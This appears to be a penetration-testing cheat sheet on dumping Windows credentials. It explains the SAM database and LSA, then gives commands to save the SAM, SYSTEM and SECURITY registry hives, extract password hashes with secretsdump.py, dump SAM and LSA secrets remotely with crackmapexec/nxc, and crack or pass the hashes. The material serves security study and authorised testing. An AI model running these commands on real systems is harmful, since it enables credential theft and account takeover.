The **SAM (Security Account Manager) database** in Windows is a system file that stores user account information and security credentials for the local computer. It contains usernames, hashed passwords, and group memberships for accounts managed on the local machine. The SAM database is critical for the authentication process and is used by the Local Security Authority (LSA) to verify user credentials during login.

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |
Copy Registry Hives:

```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Copy files to attacking system, using SMB or some other method, then:

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Crack with hashcat or use PTH.

Remotely, needs administrator level credentials:

```bash
crackmapexec smb x.x.x.x -u <user> -p <pass> --local-auth --sam
```

### LSA

The **Local Security Authority (LSA)** in Windows is a key component of the operating system responsible for enforcing security policies, managing user authentication, and handling logon processes. It verifies user credentials by interacting with the Security Account Manager (SAM) database and other authentication mechanisms, such as Kerberos or NTLM. The LSA temporarily stores clear text credentials in memory for specific functions, such as enabling single sign-on (SSO) or delegating credentials for remote authentication.

The LSA also manages security tokens, which define a user’s permissions and privileges after successful authentication. It plays a crucial role in maintaining system security by enforcing access controls and ensuring the integrity of authentication processes.

```bash
nxc smb x.x.x.x -u <user> -p <pass> --local-auth --lsa
```